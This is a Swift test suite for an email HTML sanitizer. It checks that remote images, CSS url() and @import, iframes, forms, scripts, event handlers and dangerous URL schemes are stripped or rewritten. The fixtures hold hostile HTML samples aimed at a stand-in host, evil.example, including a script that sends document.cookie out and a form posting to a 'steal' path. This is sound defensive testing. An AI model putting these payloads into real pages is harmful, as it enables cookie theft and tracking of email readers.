import Foundation
import Testing
@testable import MailternalSanitizer

@Test("img src http(s) is rewritten to mailternal-part and marked blocked")
func imgSrcRemoteRewrite() {
    let html = #"<img src="https://evil.example/pixel.png" alt="x">"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let remotes = remoteEntries(result)
    #expect(remotes.count == 1)
    #expect(remotes[0].blockedByDefault)
    if case .remote(let url) = remotes[0].reference {
        #expect(url.host == "evil.example")
        #expect(url.path.contains("pixel.png"))
    } else {
        Issue.record("expected a remote reference")
    }
    #expect(result.html.contains("mailternal-part://"))
    #expect(!result.html.contains("https://evil.example"))
}

@Test("img src cid is rewritten and not blocked by default")
func imgSrcCIDRewrite() {
    let html = #"<p><img src="cid:ii_abc123@mail.example" alt="inline"></p>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(result.manifest.entries.count == 1)
    let entry = result.manifest.entries.values.first!
    #expect(!entry.blockedByDefault)
    if case .cid(let cid) = entry.reference {
        #expect(cid == "ii_abc123@mail.example")
    } else {
        Issue.record("expected a cid reference")
    }
    #expect(result.html.contains("mailternal-part://"))
    #expect(!result.html.contains("cid:ii_abc123@mail.example"))
}

@Test("cid rewrite is case-insensitive on the scheme")
func cidSchemeCase() {
    let result = HTMLSanitizer.sanitize(#"<img src="CID:Foo@Bar">"#)
    let cids = result.manifest.entries.values.compactMap { entry -> String? in
        if case .cid(let cid) = entry.reference { return cid }
        return nil
    }
    #expect(cids == ["Foo@Bar"])
}

@Test("CSS url() in a style attribute is stripped, not rewritten")
func cssURLInStyleAttribute() {
    let html = #"<div style="color:red; background-image: url(https://evil.example/bg.png);">x</div>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(result.manifest.entries.isEmpty)
    #expect(!result.html.lowercased().contains("url("))
    #expect(!result.html.contains("evil.example"))
}

@Test("CSS @import and url() in a style block are stripped")
func cssImportAndURLInStyleBlock() {
    let html = """
    <html><head><style>
    @import url("https://evil.example/sheet.css");
    body { background: url('https://evil.example/bg.png'); color: #111; }
    </style></head><body><p>hi</p></body></html>
    """
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("@import"))
    #expect(!lowered.contains("url("))
    #expect(!result.html.contains("evil.example"))
}

@Test("CSS escapes cannot hide url()")
func cssEscapedURL() {
    let html = #"<p style="background:\75\72\6c(https://evil.example/x.png)">x</p>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.lowercased().contains("url("))
    #expect(!result.html.contains("evil.example"))
}

@Test("srcset and imagesrcset are removed")
func srcsetRemoved() {
    let html = #"<img src="https://evil.example/a.png" srcset="https://evil.example/a-2x.png 2x" imagesrcset="https://evil.example/a-3x.png 3x">"#
    let result = HTMLSanitizer.sanitize(html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("srcset"))
    #expect(!result.html.contains("a-2x.png"))
    #expect(!result.html.contains("a-3x.png"))
    #expect(remoteEntries(result).count == 1)
}

@Test("SVG use/href is removed")
func svgUseRemoved() {
    let html = #"<svg><use href="https://evil.example/icon.svg#x" xlink:href="https://evil.example/icon.svg#x"></use></svg>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.lowercased().contains("<use"))
    #expect(!result.html.contains("evil.example"))
    #expect(result.manifest.entries.isEmpty)
}

@Test("SVG image href is rewritten like img src")
func svgImageHrefRewritten() {
    let html = #"<svg><image href="https://evil.example/pic.png"></image></svg>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(remoteEntries(result).count == 1)
    #expect(!result.html.contains("https://evil.example"))
}

@Test("iframe is removed including data: iframe")
func iframeRemoved() {
    let html = #"<p>a<iframe src="https://evil.example/frame"></iframe>b<iframe src="data:text/html,x"></iframe>c</p>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.lowercased().contains("<iframe"))
    #expect(!result.html.contains("evil.example"))
    #expect(!result.html.contains("data:text/html"))
}

@Test("form and form action are removed")
func formRemoved() {
    let html = #"<form action="https://evil.example/steal"><input name="x" value="y"><p>keep me</p></form>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("<form"))
    #expect(!lowered.contains("<input"))
    #expect(!lowered.contains("action="))
    #expect(result.html.contains("keep me"))
}

@Test("meta refresh is removed")
func metaRefreshRemoved() {
    let html = #"<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/"></head><body>x</body></html>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("http-equiv"))
    #expect(!lowered.contains("refresh"))
    #expect(!result.html.contains("evil.example"))
}

@Test("javascript: links are stripped")
func javascriptLinksStripped() {
    let html = #"<a href="javascript:alert(document.cookie)">click</a><a href="JAVASCRIPT:alert(1)">two</a>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.lowercased().contains("javascript:"))
    #expect(result.html.contains("click"))
    #expect(result.html.contains("two"))
}

@Test("event handlers are stripped")
func eventHandlersStripped() {
    let html = #"<img src="cid:x@y" alt="a" onerror="alert(1)" onload="steal()" onclick="x()"><p onmouseover="x" onfocus="y">t</p>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("onerror"))
    #expect(!lowered.contains("onload"))
    #expect(!lowered.contains("onclick"))
    #expect(!lowered.contains("onmouseover"))
    #expect(!lowered.contains("onfocus"))
}

@Test("script tags are removed")
func scriptRemoved() {
    let html = #"<p>ok<script>fetch('https://evil.example/'+document.cookie)</script></p>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.lowercased().contains("<script"))
    #expect(!result.html.contains("document.cookie"))
}

@Test("base, link stylesheet, object, embed, applet are removed")
func requestBearingTagsRemoved() {
    let html = """
    <base href="https://evil.example/">
    <link rel="stylesheet" href="https://evil.example/mail.css">
    <object data="https://evil.example/x"></object>
    <embed src="https://evil.example/y">
    <applet code="Evil.class"></applet>
    <p>body</p>
    """
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("<base"))
    #expect(!lowered.contains("<link"))
    #expect(!lowered.contains("<object"))
    #expect(!lowered.contains("<embed"))
    #expect(!lowered.contains("<applet"))
    #expect(result.html.contains("body"))
}

@Test("audio video track source are removed")
func mediaRemoved() {
    let html = #"<audio src="https://evil.example/a.mp3"></audio><video src="https://evil.example/v.mp4"><source src="https://evil.example/v.webm"></video><track src="https://evil.example/t.vtt">"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("<audio"))
    #expect(!lowered.contains("<video"))
    #expect(!lowered.contains("<track"))
    #expect(!lowered.contains("<source"))
}

@Test("data: non-image is stripped; data:image/png survives")
func dataSchemes() {
    let html = """
    <img src="data:text/html,alert">
    <img src="data:image/svg+xml,<svg></svg>">
    <img alt="ok" src="data:image/png;base64,AAAA">
    """
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.contains("data:text/html"))
    #expect(!result.html.contains("data:image/svg"))
    #expect(result.html.contains("data:image/png;base64,AAAA"))
}

@Test("file: and custom schemes are stripped")
func customSchemesStripped() {
    let html = #"<img src="file:///etc/passwd"><img src="ms-help://x"><a href="vbscript:msgbox(1)">x</a><a href="about:blank">y</a>"#
    let result = HTMLSanitizer.sanitize(html)
    assertNoExfiltration(result.html)
    #expect(!result.html.lowercased().contains("file:"))
    #expect(!result.html.lowercased().contains("ms-help:"))
    #expect(!result.html.lowercased().contains("vbscript:"))
    #expect(!result.html.lowercased().contains("about:blank"))
}

@Test("https hyperlinks survive as user-activated links")
func httpsAnchorsSurvive() {
    let html = #"<p>See <a href="https://lists.example/thread">this</a> and https://evil.example in text.</p>"#
    let result = HTMLSanitizer.sanitize(html)
    #expect(result.html.contains("https://lists.example/thread"))
    #expect(result.html.contains("https://evil.example"))
}

@Test("mailto links survive")
func mailtoSurvives() {
    let result = HTMLSanitizer.sanitize(#"<a href="mailto:ada@example.com">mail</a>"#)
    #expect(result.html.contains("mailto:ada@example.com"))
}

@Test("same document fragments survive")
func fragmentSurvives() {
    let result = HTMLSanitizer.sanitize("<a href='#section'>go</a><h2 id='section'>S</h2>")
    #expect(result.html.contains("#section"))
}

@Test("sanitize is idempotent")
func sanitizeIdempotent() {
    let samples = [
        #"<img src="https://evil.example/pixel.png">"#,
        #"<img src="cid:foo@bar" alt="n">"#,
        #"<div style="background:url(https://evil.example/x.png)">z</div>"#,
        #"<p onmouseover="x">hi <a href="javascript:alert(1)">a</a></p>"#,
        #"<iframe src="https://evil.example"></iframe><form action="https://evil.example"></form>"#,
        "<style>@import 'https://evil.example/s.css'; p{color:red}</style><p>x</p>",
        #"<svg><use href="https://evil.example/u"></use><image href="https://evil.example/i.png"></image></svg>"#,
        #"<img src="https://a.example/x.png" srcset="https://a.example/y.png 2x">"#,
        "plain text only",
        "",
    ]
    for sample in samples {
        let once = HTMLSanitizer.sanitize(sample)
        let twice = HTMLSanitizer.sanitize(once.html)
        #expect(once.html == twice.html)
        #expect(once.manifest == twice.manifest)
    }
}

@Test("identical references share one deterministic token")
func deterministicTokens() {
    let html = #"<img src="https://evil.example/a.png"><img src="https://evil.example/a.png">"#
    let result = HTMLSanitizer.sanitize(html)
    #expect(result.manifest.entries.count == 1)
    let again = HTMLSanitizer.sanitize(html)
    #expect(result.manifest == again.manifest)
    #expect(result.html == again.html)
}

@Test("SVG filter and foreignObject are removed")
func svgFilterAndForeignObjectRemoved() {
    let html = #"<svg><filter id="f"></filter><foreignObject><p>x</p></foreignObject></svg>"#
    let result = HTMLSanitizer.sanitize(html)
    let lowered = result.html.lowercased()
    #expect(!lowered.contains("<filter"))
    #expect(!lowered.contains("foreignobject"))
}

private func remoteEntries(_ result: SanitizedHTML) -> [ResourceEntry] {
    Array(result.manifest.entries.values.filter(\.blockedByDefault))
}

private func assertNoExfiltration(_ html: String) {
    let lowered = html.lowercased()
    #expect(!lowered.contains("<script"))
    #expect(!lowered.contains("<iframe"))
    #expect(!lowered.contains("<form"))
    #expect(!lowered.contains("javascript:"))
    #expect(!lowered.contains("@import"))
    #expect(!lowered.contains("url("))
    #expect(!lowered.contains("srcset"))
    #expect(!lowered.contains("http-equiv"))
    #expect(lowered.range(of: "\\son[a-z]+\\s*=", options: .regularExpression) == nil)
    #expect(lowered.range(of: "\\ssrc\\s*=\\s*[\"']?\\s*https?:", options: .regularExpression) == nil)
}
